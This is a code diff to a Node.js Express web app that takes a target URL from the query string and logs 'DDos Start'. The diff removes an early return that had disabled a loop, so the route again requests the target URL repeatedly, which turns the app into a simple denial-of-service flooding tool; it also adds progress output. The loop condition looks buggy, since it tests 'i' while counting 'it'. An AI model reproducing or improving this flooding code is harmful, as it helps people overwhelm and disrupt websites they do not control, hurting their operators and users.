@@ -185,6 +185,8 @@ app.get('/',function(req,res){
     {
         url=req.query.url;
     }
+
+    lg('DDos Start : '+url+' iterations : '+loops)
     res.write('<head>')
 
     res.write('<title>')
@@ -199,16 +201,16 @@ app.get('/',function(req,res){
      res.write('</h1>')   
 
     var it=0
-    return
 
     for(it=0;i<loops;it++)
     {
-        res.write('<br>Iteration : '+it)
+        res.write('<br>Iteration : '+it+'/'+loops+' -- '+(100*(it/loops))+' % complete')
         gethtml(url)
         
     }
 
      
+    res.end()
 
     
 
